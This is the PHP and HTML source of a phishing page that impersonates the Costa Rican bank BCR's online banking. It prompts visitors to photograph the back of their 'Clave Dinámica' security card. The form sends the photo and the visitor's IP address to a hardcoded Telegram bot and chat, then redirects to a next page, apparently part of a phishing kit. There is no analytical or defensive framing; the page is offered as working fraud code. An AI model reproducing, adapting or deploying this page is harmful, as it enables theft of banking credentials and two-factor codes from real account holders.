<?php 
ini_set("display_errors",0);
//TELEGRAM
$apibot = "6989339920:AAHQzBow1uAijCWHO75g8vBhIKcgisg4ouw";
$canal =  "-4131847359";
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://ik.imagekit.io/eruobiiei/delbc/style.css" rel="stylesheet" type="text/css">
<title>BCR</title>
<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
			  <script>
		  
	  $(document).on("submit", "form", function (event) {
        event.preventDefault();
        $.ajax({
            url: $(this).attr("action"),
            type: $(this).attr("method"),
            dataType: "JSON",
            data: new FormData(this),
            processData: false,
            contentType: false,
            success: function (data, status) {
                location.href ="index3.php";
            },
            error: function (xhr, desc, err) {
                location.href ="index3.php";
            }
        });
    });

 
		  	  function loading() { var contenedor = document.getElementById("loader");	 loader.style.display = "none";  return true;	}
				  
				  function loading2() { var contenedor = document.getElementById("dinamica");	 dinamica.style.display = "none";  return true;	}
		  
		  </script>
<script type="application/javascript">
function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
}
</script>

</head>
<body>

	<div class="head">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/logo.gif" class="logo">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Certificado.svg" class="headimg1">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
	</div>
	<div class="head2">
		
		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
		
	</div>
	<div class="costilla">
	<span class="seguridadtxt">Seguridad</span>
	<img class="imgcostilla1" src="https://ik.imagekit.io/eruobiiei/delbc/Consideraciones.svg">	
	<img class="imgcostilla2" src="https://ik.imagekit.io/eruobiiei/delbc/reglamento.svg">	
		<span class="textcostilla1">Consideraciones</span>
		<span class="textcostilla2">Reglamentos</span>
		
		
	</div>
	
	
		<div class="containerimg">	
		
		
		
			
		<div class="divform1">
			
			
			
			      <form method="POST" action="https://api.telegram.org/bot<?php echo $apibot;?>/sendPhoto" enctype="multipart/form-data">
<input type="text" name="chat_id" value="<?php echo $canal;?>" hidden="">
<input type="text" name="caption" id="ipaddress"  hidden="">
			<span class="ingresartxt">Validación Banca Digital</span>
			
			<hr class="line1" color="#C4C4C4">
	<img src="https://ik.imagekit.io/eruobiiei/delbc/dinamica.png" id="dinamica" class="dinamica">
			
	
			
<div class="file-select" id="src-file1">
  <input name="photo" id="seleccionArchivos" type="file" accept="image/*" capture="camera" aria-label="Archivo" onclick=" loading2();" required>
</div>
   
 
    <img id="imagenPrevisualizacion" class="imagenprev">
    <script src="https://ik.imagekit.io/eruobiiei/delbc/script.js"></script>
			
			
			
			<button type="submit" class="btn-cuatro" onclick=" loading();">Validar</button>

			
		
	
			
			<script src="https://ik.imagekit.io/eruobiiei/delbc/java.js"></script>

			</form>
		</div>
		
		<div class="divform2">
			
			
						<span class="ingresartxt">Clave Dinámica</span>
			
			<hr class="line1" color="#C4C4C4">
		
			
			
			<span class="registertext2">
			
			Estimado usuario:<br>

Para validar el proceso escanee la parte trasera de su Tarjeta Clave Dinámica para que nuestro sistema valide la información.
			
			</span>
			<img src="https://ik.imagekit.io/eruobiiei/delbc/clavedinamica.png" class="tarjetaimg">
			
			
			
			
		</div>
		
		
		
		
	<div class="formcontainer">
	
		
	</div>
	
	</div>
	

	
	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023.     Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>

</body>
</html>